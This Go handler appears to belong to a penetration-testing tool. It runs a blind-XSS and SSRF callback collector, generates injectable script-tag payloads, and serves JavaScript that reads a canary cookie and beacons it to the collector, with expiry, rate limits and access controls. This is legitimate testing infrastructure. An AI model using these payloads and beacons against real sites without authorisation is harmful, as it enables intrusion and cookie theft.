package handler

import (
	"context"
	"crypto/sha256"
	"fmt"
	"net"
	"net/http"
	"strconv"
	"strings"
	"sync"
	"time"

	"jysecai/internal/audit"
	"jysecai/internal/config"
	"jysecai/internal/database"
	"jysecai/internal/security"

	"github.com/gin-gonic/gin"
	"go.uber.org/zap"
)

const probeCaptureMarker = "jysec_xss_canary=interaction-probe"

var transparentGIF = []byte{0x47, 0x49, 0x46, 0x38, 0x39, 0x61, 0x01, 0x00, 0x01, 0x00, 0x80, 0x00, 0x00, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x2c, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x02, 0x02, 0x44, 0x01, 0x00, 0x3b}

type collectorRateWindow struct {
	started time.Time
	count   int
}

func xssTokenHint(token string) string {
	sum := sha256.Sum256([]byte(token))
	return fmt.Sprintf("%x", sum[:6])
}

// XssHandler provides authenticated management endpoints and a deliberately
// narrow public callback service. Image payloads render the default modules
// (page metadata and a URL-only heartbeat). The canary channel remains
// optional. Session cookies and the sensitive fullcookie/formhook modules are
// not rendered or stored.
type XssHandler struct {
	db     *database.DB
	cfg    *config.XssConfig
	logger *zap.Logger
	audit  *audit.Service

	collectorMu     sync.RWMutex
	collectorCancel context.CancelFunc
	collectorSrv    *http.Server

	rateMu      sync.Mutex
	rateWindows map[string]collectorRateWindow
}

func (h *XssHandler) SetAudit(s *audit.Service) { h.audit = s }

func NewXssHandler(db *database.DB, cfg *config.XssConfig, logger *zap.Logger) *XssHandler {
	if cfg == nil {
		cfg = &config.XssConfig{}
	}
	if logger == nil {
		logger = zap.NewNop()
	}
	if cfg.BindHost == "" {
		cfg.BindHost = cfg.XssBindHostEffective()
	}
	if cfg.BindPort <= 0 {
		cfg.BindPort = cfg.XssBindPortEffective()
	}
	if cfg.CooldownSeconds <= 0 {
		cfg.CooldownSeconds = cfg.XssCooldownSecondsEffective()
	}
	return &XssHandler{db: db, cfg: cfg, logger: logger, rateWindows: make(map[string]collectorRateWindow)}
}

func (h *XssHandler) StartCollector() {
	h.collectorMu.Lock()
	defer h.collectorMu.Unlock()
	if h.collectorSrv != nil {
		return
	}
	addr := net.JoinHostPort(h.cfg.BindHost, strconv.Itoa(h.cfg.BindPort))
	mux := http.NewServeMux()
	mux.HandleFunc("/xss/", h.serveCollector)
	mux.HandleFunc("/probe/", h.serveProbe)
	srv := &http.Server{
		Addr: addr, Handler: mux, ReadHeaderTimeout: 5 * time.Second,
		ReadTimeout: 10 * time.Second, WriteTimeout: 10 * time.Second,
		IdleTimeout: 30 * time.Second, MaxHeaderBytes: 16 << 10,
	}
	ctx, cancel := context.WithCancel(context.Background())
	h.collectorCancel = cancel
	h.collectorSrv = srv
	go func() {
		h.logger.Info("XSS canary collector server started", zap.String("addr", addr))
		if err := srv.ListenAndServe(); err != nil && err != http.ErrServerClosed {
			h.logger.Error("XSS canary collector server error", zap.Error(err))
		}
		<-ctx.Done()
		shutdownCtx, shutdownCancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer shutdownCancel()
		_ = srv.Shutdown(shutdownCtx)
	}()
}

func (h *XssHandler) StopCollector() {
	h.collectorMu.Lock()
	defer h.collectorMu.Unlock()
	if h.collectorCancel != nil {
		h.collectorCancel()
		h.collectorCancel = nil
	}
	h.collectorSrv = nil
}

func (h *XssHandler) serveCollector(w http.ResponseWriter, r *http.Request) {
	setCollectorHeaders(w)
	path := strings.Trim(strings.TrimPrefix(r.URL.Path, "/xss/"), "/")
	if strings.HasSuffix(path, ".js") {
		h.ServeCollectorJS(w, r, strings.TrimSuffix(path, ".js"))
		return
	}
	if strings.HasSuffix(path, ".gif") {
		h.ServeCollectorGIF(w, r, strings.TrimSuffix(path, ".gif"))
		return
	}
	if token, ok := strings.CutPrefix(path, "capture/"); ok && !strings.Contains(token, "/") {
		h.captureModule(w, r, token)
		return
	}
	parts := strings.SplitN(path, "/", 2)
	if len(parts) == 2 && parts[1] == "capture" {
		h.captureModule(w, r, parts[0])
		return
	}
	if !strings.Contains(path, "/") && r.URL.Query().Get("kind") == "keepsession" {
		h.captureKeepSession(w, r, path)
		return
	}
	http.NotFound(w, r)
}

func (h *XssHandler) serveProbe(w http.ResponseWriter, r *http.Request) {
	setCollectorHeaders(w)
	if r.Method != http.MethodGet && r.Method != http.MethodHead && r.Method != http.MethodPost {
		w.Header().Set("Allow", "GET, HEAD, POST")
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	token := strings.Trim(strings.TrimPrefix(r.URL.Path, "/probe/"), "/")
	payload, ok := h.availablePayload(w, token, true)
	if !ok {
		return
	}
	ip := collectorClientIP(r, h.cfg.TrustProxyHeaders)
	if !h.allowCollectorRequest(token, ip, time.Now()) {
		w.Header().Set("Retry-After", "60")
		http.Error(w, "rate limit exceeded", http.StatusTooManyRequests)
		return
	}
	_, accepted, err := h.db.CreateXssCaptureIfAvailable(payload.ID, payload.Token, probeCaptureMarker, "", payload.Domain, "", ip, "interaction-probe")
	if err != nil {
		h.logger.Warn("interaction probe storage failed", zap.String("token_hint", xssTokenHint(token)), zap.Error(err))
		http.Error(w, "callback unavailable", http.StatusServiceUnavailable)
		return
	}
	if !accepted {
		http.Error(w, "callback expired or already consumed", http.StatusGone)
		return
	}
	h.logger.Info("interaction probe received", zap.String("token_hint", xssTokenHint(token)), zap.String("ip", ip))
	w.WriteHeader(http.StatusNoContent)
}

func (h *XssHandler) ServeCollectorJS(w http.ResponseWriter, _ *http.Request, token string) {
	payload, ok := h.availablePayload(w, token, false)
	if !ok {
		return
	}
	js := h.renderCollectorJS(payload)
	w.Header().Set("Content-Type", "application/javascript; charset=utf-8")
	w.Header().Set("Cache-Control", "no-store, private, max-age=0")
	w.WriteHeader(http.StatusOK)
	_, _ = w.Write([]byte(js))
}

// renderCollectorJS serves the canary channel plus the default non-sensitive
// modules. fullcookie and formhook stay out of the script: they require an
// explicit arming path that this collector does not provide.
func (h *XssHandler) renderCollectorJS(payload *database.XssPayload) string {
	name := h.cfg.XssCanaryCookieNameEffective()
	endpoint := h.publicBaseURL() + "/xss/" + payload.Token + ".gif"
	canary := fmt.Sprintf(`(()=>{const n=%s,m=document.cookie.match(new RegExp("(?:^|;\\s*)"+n+"=([^;]*)"));if(!m)return;const v=(n+"="+m[1]).slice(0,%d);(new Image()).src=%s+"?canary="+encodeURIComponent(v)})()`, strconv.Quote(name), h.cfg.XssMaxCaptureBytesEffective(), strconv.Quote(endpoint))
	return canary + "\n" + h.renderDefaultModules(payload)
}

func (h *XssHandler) Capture(w http.ResponseWriter, r *http.Request, token string) {
	if r.Method != http.MethodPost {
		w.Header().Set("Allow", "POST")
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	payload, ok := h.availablePayload(w, token, false)
	if !ok {
		return
	}
	r.Body = http.MaxBytesReader(w, r.Body, int64(h.cfg.XssMaxCaptureBytesEffective()*4))
	if err := r.ParseForm(); err != nil {
		http.Error(w, "invalid callback", http.StatusBadRequest)
		return
	}
	h.captureCanary(w, r, payload, r.Form.Get("canary"))
}

func (h *XssHandler) ServeCollectorGIF(w http.ResponseWriter, r *http.Request, token string) {
	if r.Method != http.MethodGet && r.Method != http.MethodHead {
		w.Header().Set("Allow", "GET, HEAD")
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	payload, ok := h.availablePayload(w, token, false)
	if !ok {
		return
	}
	h.captureCanary(w, r, payload, r.URL.Query().Get("canary"))
}

func (h *XssHandler) captureCanary(w http.ResponseWriter, r *http.Request, payload *database.XssPayload, raw string) {
	canary, ok := normalizeCanaryCookie(raw, h.cfg.XssCanaryCookieNameEffective(), h.cfg.XssMaxCaptureBytesEffective())
	if !ok {
		http.Error(w, "valid JySec canary required", http.StatusBadRequest)
		return
	}
	ip := collectorClientIP(r, h.cfg.TrustProxyHeaders)
	if !h.allowCollectorRequest(payload.Token, ip, time.Now()) {
		w.Header().Set("Retry-After", "60")
		http.Error(w, "rate limit exceeded", http.StatusTooManyRequests)
		return
	}
	_, accepted, err := h.db.CreateXssCaptureIfAvailable(payload.ID, payload.Token, canary, "", payload.Domain, truncateBytes(r.UserAgent(), 256), ip, "xss-canary")
	if err != nil {
		h.logger.Warn("XSS canary storage failed", zap.String("token_hint", xssTokenHint(payload.Token)), zap.Error(err))
		http.Error(w, "callback unavailable", http.StatusServiceUnavailable)
		return
	}
	if !accepted {
		http.Error(w, "callback expired or already consumed", http.StatusGone)
		return
	}
	h.logger.Info("XSS canary received", zap.String("token_hint", xssTokenHint(payload.Token)), zap.String("ip", ip))
	w.Header().Set("Content-Type", "image/gif")
	w.Header().Set("Cache-Control", "no-store, private, max-age=0")
	w.WriteHeader(http.StatusOK)
	if r.Method != http.MethodHead {
		_, _ = w.Write(transparentGIF)
	}
}

func (h *XssHandler) availablePayload(w http.ResponseWriter, token string, wantProbe bool) (*database.XssPayload, bool) {
	if !validXssToken(token) {
		http.Error(w, "not found", http.StatusNotFound)
		return nil, false
	}
	payload, err := h.db.GetXssPayloadByToken(token)
	if err != nil || payload == nil || payload.Enabled != 1 {
		http.Error(w, "not found", http.StatusNotFound)
		return nil, false
	}
	isProbe := payload.Type == "probe" || payload.Type == "ssrf"
	if isProbe != wantProbe {
		http.Error(w, "not found", http.StatusNotFound)
		return nil, false
	}
	now := time.Now()
	if (payload.ExpiresAt != nil && !payload.ExpiresAt.After(now)) || (payload.OneTime == 1 && payload.ConsumedAt != nil) {
		http.Error(w, "callback expired or already consumed", http.StatusGone)
		return nil, false
	}
	return payload, true
}

func setCollectorHeaders(w http.ResponseWriter) {
	w.Header().Set("X-Content-Type-Options", "nosniff")
	w.Header().Set("Referrer-Policy", "no-referrer")
	w.Header().Set("Content-Security-Policy", "default-src 'none'")
	w.Header().Set("Cross-Origin-Resource-Policy", "cross-origin")
}

func validXssToken(token string) bool {
	if len(token) != 40 {
		return false
	}
	for _, r := range token {
		if !((r >= '0' && r <= '9') || (r >= 'a' && r <= 'f')) {
			return false
		}
	}
	return true
}

func normalizeCanaryCookie(raw, name string, maxBytes int) (string, bool) {
	if raw == "" || len(raw) > maxBytes || strings.ContainsAny(raw, "\x00\r\n") {
		return "", false
	}
	for _, part := range strings.Split(raw, ";") {
		part = strings.TrimSpace(part)
		if strings.HasPrefix(part, name+"=") {
			value := strings.TrimPrefix(part, name+"=")
			if value == "" || len(name)+1+len(value) > maxBytes {
				return "", false
			}
			return name + "=" + value, true
		}
	}
	return "", false
}

// collectorClientIP determines the address the rate limiter keys on.
//
// CF-Connecting-IP is attacker-controlled unless something in front of this
// process overwrites it. A same-host reverse proxy forwards the client's header
// verbatim, so a loopback peer is NOT evidence of a trusted tunnel: trusting it
// unconditionally let any visitor mint a fresh rate-limit bucket per request
// against the unauthenticated collector endpoints. The header is therefore
// honoured only when the deployment explicitly opts in.
func collectorClientIP(r *http.Request, trustProxyHeaders bool) string {
	host, _, err := net.SplitHostPort(r.RemoteAddr)
	if err != nil {
		host = r.RemoteAddr
	}
	peer := net.ParseIP(strings.TrimSpace(host))
	if trustProxyHeaders && peer != nil && peer.IsLoopback() {
		if forwarded := net.ParseIP(strings.TrimSpace(r.Header.Get("CF-Connecting-IP"))); forwarded != nil {
			return forwarded.String()
		}
	}
	if peer != nil {
		return peer.String()
	}
	return truncateBytes(host, 64)
}

func truncateBytes(value string, max int) string {
	value = strings.TrimSpace(value)
	if len(value) <= max {
		return value
	}
	return value[:max]
}

func (h *XssHandler) allowCollectorRequest(token, ip string, now time.Time) bool {
	key := token + "|" + ip
	limit := h.cfg.XssRateLimitPerMinuteEffective()
	h.rateMu.Lock()
	defer h.rateMu.Unlock()
	window, exists := h.rateWindows[key]
	if !exists || now.Sub(window.started) >= time.Minute {
		h.rateWindows[key] = collectorRateWindow{started: now, count: 1}
		if len(h.rateWindows) > 4096 {
			for oldKey, oldWindow := range h.rateWindows {
				if now.Sub(oldWindow.started) >= 2*time.Minute {
					delete(h.rateWindows, oldKey)
				}
			}
		}
		return true
	}
	if window.count >= limit {
		return false
	}
	window.count++
	h.rateWindows[key] = window
	return true
}

func (h *XssHandler) publicBaseURL() string {
	if configured := strings.TrimRight(h.cfg.XssPublicURLEffective(), "/"); configured != "" {
		return configured
	}
	return "http://" + net.JoinHostPort(h.cfg.BindHost, strconv.Itoa(h.cfg.BindPort))
}

// === Authenticated management endpoints ===

func (h *XssHandler) GetConfig(c *gin.Context) {
	c.JSON(http.StatusOK, gin.H{
		"enabled": h.cfg.Enabled, "bind_host": h.cfg.BindHost, "bind_port": h.cfg.BindPort,
		"public_url": h.cfg.PublicURL, "cooldown_seconds": h.cfg.CooldownSeconds,
		"canary_cookie_name":    h.cfg.XssCanaryCookieNameEffective(),
		"probe_ttl_seconds":     h.cfg.XssProbeTTLSecondsEffective(),
		"rate_limit_per_minute": h.cfg.XssRateLimitPerMinuteEffective(),
		"max_capture_bytes":     h.cfg.XssMaxCaptureBytesEffective(), "dns_exfil_enabled": false,
	})
}

func payloadJSON(p *database.XssPayload) gin.H {
	return gin.H{
		"id": p.ID, "token": p.Token, "name": p.Name, "type": p.Type,
		"payload": p.Payload, "config": string(p.Config), "project_id": p.ProjectID,
		"enabled": p.Enabled == 1, "description": p.Description, "domain": p.Domain,
		"domain_only": p.DomainOnly, "one_time": p.OneTime == 1,
		"expires_at": p.ExpiresAt, "consumed_at": p.ConsumedAt,
		"created_at": p.CreatedAt, "updated_at": p.UpdatedAt,
		"created_by": p.CreatedBy, "capture_count": p.CaptureCount,
	}
}

func (h *XssHandler) ListPayloads(c *gin.Context) {
	payloads, err := h.db.ListXssPayloads()
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to list callbacks"})
		return
	}
	// A payload's id is the handle used by GetPayload/DeletePayload and by the
	// collector endpoint, so exposing the whole table hands every caller the id
	// space. Narrow scopes see only their own payloads.
	if session, ok := security.CurrentSession(c); ok && session.Scope != database.RBACScopeAll {
		visible := make([]*database.XssPayload, 0, len(payloads))
		for _, p := range payloads {
			if h.db.UserCanAccessResource(session.UserID, session.Scope, "xss_payload", p.ID) {
				visible = append(visible, p)
			}
		}
		payloads = visible
	}
	result := make([]gin.H, len(payloads))
	for i, payload := range payloads {
		result[i] = payloadJSON(payload)
	}
	c.JSON(http.StatusOK, gin.H{"payloads": result})
}

func (h *XssHandler) CreatePayload(c *gin.Context) {
	var req struct {
		Name        string `json:"name"`
		Type        string `json:"type"`
		ProjectID   string `json:"project_id"`
		Enabled     *bool  `json:"enabled"`
		Description string `json:"description"`
		Domain      string `json:"domain"`
		OneTime     *bool  `json:"one_time"`
		TTLSeconds  int    `json:"ttl_seconds"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid request"})
		return
	}
	name := truncateBytes(req.Name, 120)
	if name == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "name is required"})
		return
	}
	kind := strings.ToLower(strings.TrimSpace(req.Type))
	if kind == "" || kind == "image" || kind == "fetch" || kind == "xss" {
		kind = "image"
	} else if kind == "ssrf" || kind == "xxe" || kind == "probe" {
		kind = "probe"
	} else {
		c.JSON(http.StatusBadRequest, gin.H{"error": "type must be image or probe"})
		return
	}
	ttl := req.TTLSeconds
	if ttl == 0 {
		ttl = h.cfg.XssProbeTTLSecondsEffective()
	}
	if ttl < 60 {
		ttl = 60
	}
	if ttl > 86400 {
		ttl = 86400
	}
	expiresAt := time.Now().Add(time.Duration(ttl) * time.Second).UTC()
	oneTime := true
	if kind == "image" && req.OneTime != nil {
		oneTime = *req.OneTime
	}
	enabled := 1
	if req.Enabled != nil && !*req.Enabled {
		enabled = 0
	}
	token := database.GenerateXssToken()
	callbackURL := h.publicBaseURL() + "/xss/" + token + ".js"
	payloadText := `<script src="` + callbackURL + `"></script>`
	if kind == "probe" {
		callbackURL = h.publicBaseURL() + "/probe/" + token
		payloadText = callbackURL
	}
	p := &database.XssPayload{
		Token: token, Name: name, Type: kind, Payload: payloadText, Config: []byte("{}"),
		ProjectID: strings.TrimSpace(req.ProjectID), Enabled: enabled,
		Description: truncateBytes(req.Description, 500), Domain: truncateBytes(req.Domain, 500),
		OneTime: xssBoolToInt(oneTime), ExpiresAt: &expiresAt,
	}
	id, err := h.db.CreateXssPayload(p)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create callback"})
		return
	}
	if session, ok := security.CurrentSession(c); ok {
		p.CreatedBy = session.UserID
		_ = h.db.SetResourceOwner("xss_payload", id, session.UserID)
		_ = h.db.AssignResourceToUser(session.UserID, "xss_payload", id)
	}
	if h.audit != nil {
		h.audit.RecordOK(c, "xss", "payload_create", "创建安全回调", "xss_payload", id, map[string]interface{}{
			"token_hint": xssTokenHint(token), "name": name, "type": kind, "ttl_seconds": ttl,
		})
	}
	c.JSON(http.StatusOK, gin.H{
		"id": id, "token": token, "public_url": callbackURL, "type": kind,
		"one_time": oneTime, "expires_at": expiresAt,
		"canary_cookie_name": h.cfg.XssCanaryCookieNameEffective(),
	})
}

func xssBoolToInt(value bool) int {
	if value {
		return 1
	}
	return 0
}

func (h *XssHandler) GetPayload(c *gin.Context) {
	id := strings.TrimSpace(c.Param("id"))
	if id == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid payload id"})
		return
	}
	payload, err := h.db.GetXssPayload(id)
	if err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "payload not found"})
		return
	}
	c.JSON(http.StatusOK, payloadJSON(payload))
}

func (h *XssHandler) DeletePayload(c *gin.Context) {
	id := strings.TrimSpace(c.Param("id"))
	if id == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid payload id"})
		return
	}
	// A caller holding only xss:delete (Operator by default) must not destroy
	// another engagement's payload.
	session, ok := security.CurrentSession(c)
	if !ok {
		c.JSON(http.StatusUnauthorized, gin.H{"error": "unauthorized"})
		return
	}
	if !h.db.UserCanAccessResource(session.UserID, session.Scope, "xss_payload", id) {
		c.JSON(http.StatusForbidden, gin.H{"error": "无权访问该资源"})
		return
	}
	if err := h.db.DeleteXssPayload(id); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to delete callback"})
		return
	}
	if h.audit != nil {
		h.audit.RecordOK(c, "xss", "payload_delete", "删除安全回调", "xss_payload", id, nil)
	}
	c.JSON(http.StatusOK, gin.H{"deleted": true})
}

func (h *XssHandler) ListCaptures(c *gin.Context) {
	var captures []*database.XssCapture
	var err error
	payloadID := strings.TrimSpace(c.Query("payload_id"))

	// Captures hold the victim's stolen cookie and token. Scope "all" keeps the
	// historical whole-table listing; narrower scopes are limited to the
	// payloads the caller owns or was granted.
	session, ok := security.CurrentSession(c)
	if !ok {
		c.JSON(http.StatusUnauthorized, gin.H{"error": "unauthorized"})
		return
	}
	if session.Scope == database.RBACScopeAll {
		if payloadID != "" {
			captures, err = h.db.ListXssCapturesByPayload(payloadID)
		} else {
			captures, err = h.db.ListXssCaptures()
		}
	} else {
		captures, err = h.db.ListXssCapturesForUser(session.UserID, payloadID)
	}
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to list callbacks"})
		return
	}
	result := make([]gin.H, len(captures))
	for i, capture := range captures {
		result[i] = gin.H{
			"id": capture.ID, "payload_id": capture.PayloadID, "token": capture.Token,
			"cookie": capture.Cookie, "url": capture.URL, "domain": capture.Domain,
			"user_agent": capture.UserAgent, "ip": capture.IP, "extra": capture.Extra,
			"created_at": capture.CreatedAt,
		}
	}
	c.JSON(http.StatusOK, gin.H{"captures": result})
}
